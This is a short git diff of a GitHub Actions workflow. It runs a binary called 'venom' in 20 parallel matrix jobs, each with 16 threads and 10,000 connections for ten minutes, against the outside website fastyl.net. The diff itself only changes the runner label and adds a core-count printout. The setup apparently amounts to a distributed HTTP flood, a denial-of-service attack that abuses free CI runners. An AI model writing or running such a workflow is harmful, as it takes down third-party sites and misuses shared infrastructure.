@@ -1,4 +1,4 @@
-name: Parallel Pipeline with 4-Core VM
+name: Parallel Pipeline
 
 on:
   workflow_dispatch:
@@ -9,7 +9,7 @@ permissions:
 
 jobs:
   parallel-job:
-    runs-on: ubuntu-latest-4-cores
+    runs-on: ubuntu-latest
     strategy:
       matrix:
         job-number: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
@@ -19,7 +19,7 @@ jobs:
 
       - name: Make venom executable and run
         run: |
-          chmod +x ./venom 
-          nproc 
+          chmod +x ./venom
+          echo "Number of cores available:"
+          nproc
           ./venom -t16 -c10000 -d10m https://fastyl.net/
-        shell: /usr/bin/bash -e {0}
